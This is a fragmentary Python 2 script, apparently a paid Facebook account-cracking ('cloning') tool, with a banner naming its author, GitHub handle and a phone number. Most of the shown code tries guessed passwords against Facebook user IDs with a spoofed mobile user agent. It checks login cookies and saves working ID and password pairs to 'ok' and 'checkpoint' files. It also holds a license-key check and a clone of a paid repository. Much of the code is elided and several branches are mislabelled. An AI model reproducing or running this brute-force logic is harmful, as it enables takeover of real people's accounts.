...
'\x1b[1;91m' ༄Mr𝙧᭄•─────────────────•༄𝐌𝐚𝐡𝐢𝐧᭄
'\x1b[1;91m'   Author      ||    𝐀𝐫𝐚𝐟𝐚𝐭 𝐌𝐚𝐡𝐢𝐧     
'\x1b[1;92m'   Github      ||     arafat-mahin310 
'\x1b[1;93m'   FB ID       ||    1𝐀𝐫𝐚𝐟𝐚𝐭 𝐌𝐚𝐡𝐢𝐧
'\x1b[1;94m'   TOOL TYPE   ||    PAID
'\x1b[1;96m'   WAP NUMBER  ||    01925798757            
'\x1b[1;91m' ༄Mr𝙧᭄•─────────────────•༄𝐌𝐚𝐡𝐢𝐧᭄
"""
dec="2"
server="2"
...
def main_apv():
    ...
    print logo
    try:
        key1=open("/sdcard/ArafaT-MahiN.txt",'r').read()
    except IOError:
        os.system("clear")
        print logo
        ...
        kok=open("/sdcard/ArafaT-MahiN.txt",'w')
        kok.write(myid+imt)
        kok.close()
        print ("")
    ...
    r1=requests.get("https://github.com/arafat-mahin310/Approve-Pro.txt.git").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
        ...
        os.system("xdg-open https://wa.me/+08801925798757")
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("        Member In ArafaT-MahiN Paid Commands ")
        print ("        ENJOY  KRO BHI LOGO ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("git clone https://github.com/ArafaT-MahiNXKhan/Paid")
...
def numcloning():
    ...
    print ""
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄ArafaT-MahiN𝙧᭄"| lolcat')
...
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[ArafaT-MahiN-OK] "+coc+user + " | " + pass1
                ok=open('ArafaT-MahiN-ok.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;92m[ArafaT-MahiN-OK] "+coc+user + " | " + pass1
                    cp=open('ArafaT-MahiN random-co.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
    ...
    print "\033[1;93m BAAKI NAAM TO SONA HOGAA [ArafaT-MahiN])"
    print 40*'-'
    print ''
...
def mineExt():
    ...
    print g+"[=] Extracting From ArafaT-MahiN : "+my_line[:15]
...
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[ArafaT-MahiN-OK] "+uid + " | " + pass1
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[ArafaT-MahiN-OK] "+uid + " | " + pass2
                        ok=open('rsa-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[ArafaT-MahiN-OK] "+uid + " | " + pass3
                                ok=open('rsa-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[ArafaT-MahiN-CP] "+uid + " | " + pass3
                                    cp=open('rsa-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[ArafaT-MahiN-OK] "+uid + " | " + pass4
                                        ok=open('rsa-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[ArafaT-MahiN-CP] "+uid + " | " + pass4
                                            cp=open('rsa-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[ArafaT-MahiN-OK] "+uid + " | " + pass5
                                                ok=open('rsa-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[ArafaT-MahiN-CP] "+uid + " | " + pass5
                                                    cp=open('rsa-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
    ...
    print "\033[1;93m NAAM TO SONA HOGAA [ArafaT-MahiN])"
    print 39*'-'
    print ''
    raw_input(' Press enter to back ')
    fb_menu()
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[ArafaT-MahiN-CP] "+uid + " | " + pass2
                            cp=open('ArafaT-MahiN-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[ArafaT-MahiN-OK] "+uid + " | " + pass3
                                    cp=open('ArafaT-MahiN-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;97m[ArafaT-MahiN-CP] "+uid + " | " + pass5
                                                    cp=open('ArafaT-MahiN-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
        ...
        try:
            ...
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    print "\x1b[1;91m[ArafaT-MahiN-OK] "+uid + " | " + pass1
                    cp=open('ArafaT-MahiN-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
            ...
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    ...
                    if "access_token" in q:
                        ...
                        if "www.facebook.com" in q ["error_msg"]:
                            print "\x1b[1;91m[ArafaT-MahiN-OK] "+uid + " | " + pass2
                            cp=open('ArafaT-MahiN-ok.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;97m[ArafaT-MahiN-CP] "+uid + " | " + pass3
                                    cp=open('ArafaT-MahiN-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;92m[ArafaT-MahiN-CP] "+uid + " | " + pass5
                                                    cp=open('ArafaT-MahiN-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[ArafaT-MahiN-OK] "+uid + " | " + pass6
                                                        ok=open('ArafaT-MahiN-ok.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;91m[ArafaT-MahiN-CP] "+uid + " | " + pass6
                                                            cp=open('ArafaT-MahiN-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
